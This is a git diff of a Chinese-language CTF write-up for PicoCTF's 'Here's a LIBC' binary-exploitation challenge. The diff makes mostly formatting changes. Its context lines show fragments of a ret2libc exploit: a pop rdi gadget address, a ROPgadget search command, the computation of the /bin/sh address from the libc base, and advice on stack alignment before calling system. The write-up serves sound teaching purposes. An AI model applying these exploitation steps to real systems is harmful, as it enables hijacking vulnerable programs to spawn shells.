@@ -3,20 +3,20 @@ title: 【CTF-WriteUp】PicoCTF-Here's a LIBC
 date: 2023-10-20
 tags:
   - ctf
+  - security
 ---
 
 題目：
-	
-	給你指定的libc與elf file請pwn掉它
+給你指定的libc與elf file請pwn掉它
 
 # 概念：
 
-* 組合語言課學的各種東西
-* 逆向工程
-* Little endian
-* stack frame
-* ELF format
-* ret2libc
+- 組合語言課學的各種東西
+- 逆向工程
+- Little endian
+- stack frame
+- ELF format
+- ret2libc
 
 # 題解：
 
@@ -51,7 +51,7 @@ char convert_case(char c, int f){
     ret = a - 32;
   else
     ret = a;
-  
+
   return ret;
 }
 void do_stuff(){
@@ -95,7 +95,7 @@ print(hex(puts_plt))
 
 mainadr = elf.sym['main'] # 找到puts後我們還要繼續讓程式正常執行，所以要讓程式跳到main
 
-poprdi = 0x400913 
+poprdi = 0x400913
 # 在64位元，傳遞第一個參數(rdi)給函式的方法是pop rdi; ret，可以使用ROPGadget工具直接找這段程式的位址
 # ROPGadget --binary ./vuln | grep "pop rdi"
 
@@ -123,7 +123,6 @@ binsh = libc_base + next(libc.search(b'/bin/sh\x00')) # 找/bin/sh這個字串�
 
 在64位元環境下執行system記憶體要16 bytes對齊(rsp的尾數必須是0)，不是的話會Segmentation fault，
 只要在前面加一個ret指令就對齊了
-
 
 ### exploit
 
